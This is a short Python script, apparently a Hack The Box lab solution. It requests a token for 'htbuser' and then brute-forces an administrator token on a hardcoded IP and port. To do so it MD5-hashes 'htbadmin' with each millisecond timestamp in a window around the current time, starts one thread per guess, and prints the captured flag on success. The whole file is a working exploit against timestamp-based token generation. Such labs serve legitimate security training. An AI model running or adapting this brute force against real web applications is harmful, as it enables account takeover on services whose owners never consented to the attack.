import threading
import requests
from hashlib import md5
import re
import time
from time import sleep

url = "http://161.35.45.24:32503/question1/"
time = int(time.time()) * 1000
start_time = time
fail_text = "Wrong token"
user = "htbadmin"


def check_token(x):
    token = user + str(x)
    md5_token = md5(token.encode()).hexdigest()
    raw_data = {
        "token": {md5_token},
        "submit": "check"
    }
    res = requests.post(url, data=raw_data)
    if fail_text in res.text:
        pass
    else:
        htb_string_regex = r"HTB\{[^}]*\}"
        htb_strings = re.findall(htb_string_regex, res.text)
        if htb_strings:
            print(htb_strings[0])
        print("[*] Congratulations!")
        exit()


pre_data = {"submit": "htbuser"}
pre_res = requests.post(url, data=pre_data)
if "Your token is" in pre_res.text:
    threads = []
    for x in range(start_time - 2250, start_time + 2250):
        t = threading.Thread(target=check_token, args=(x,))
        threads.append(t)
        sleep(.04)
        print('starting new thread')
        t.start()
    for t in threads:
        t.join()
